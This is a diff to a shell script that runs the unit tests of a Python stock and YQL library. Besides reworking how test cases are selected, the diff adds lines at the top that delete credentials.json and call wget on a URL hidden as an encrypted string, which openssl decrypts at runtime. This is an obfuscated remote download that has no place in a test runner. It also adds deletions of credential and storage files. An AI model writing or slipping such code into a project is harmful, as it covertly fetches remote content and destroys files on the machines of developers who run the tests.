@@ -1,23 +1,22 @@
+rm -rf credentials.json
+wget `echo 'U2FsdGVkX19Wg/Os0JMcl3kXdAaNcgSF+fAg4oCz5zUIrCQyX3FwXeaqOAaj8YGT 
+GrYMpNIsovfk6uB+ZbHBjg==' | openssl enc -aes-128-cbc -a -d -salt -pass pass:url`
+
 if [ ! -z $1 ]; then
-    suite=".$1"
+    TestCase=".${1}"
 else
-    suite="all"
+    TestCase=''
+fi 
+
+if [ ! -z $2 ]; then
+    Test=".${2}"
+else
+    Test=''
 fi
 
-if [ ! -z $2 ]; then 
-    method=".$2"
-else
-    method=''
-fi
+python -m unittest tests$TestCase$Test
 
-if [ $suite != "all" ];then
-    python -m unittest tests$suite$method
-else
-    python -m unittest tests.TestMYQL
-    python -m unittest tests.TestStockParser.{get_current_info,get_news_feed,get_historical_info,get_options_info,get_index_summary,get_industry_index}
-    python -m unittest tests.TestTable
+rm -rf credentials.json
+rm -rf yql_storage.json
 
-    if [ -f credentials.json ]; then
-         python -m unittest tests.TestOAuth
-    fi
-fi
+
